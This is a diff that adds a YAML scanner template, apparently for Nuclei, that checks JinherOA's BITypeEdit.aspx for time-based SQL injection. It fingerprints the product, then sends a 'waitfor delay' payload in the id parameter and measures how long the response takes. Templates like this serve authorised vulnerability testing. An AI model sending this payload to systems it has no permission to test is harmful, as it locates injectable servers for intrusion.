@@ -1,0 +1,45 @@
+id: poc-yaml-jinher-bitypeedit-aspx-sqli
+info:
+  name: BITypeEdit.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: JinherOA
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.BIframe/BITypeEdit.aspx/?type=edit&id=1'waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "修改报表类型"
+          - "类型名称"
+          - "请输入类型名称"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
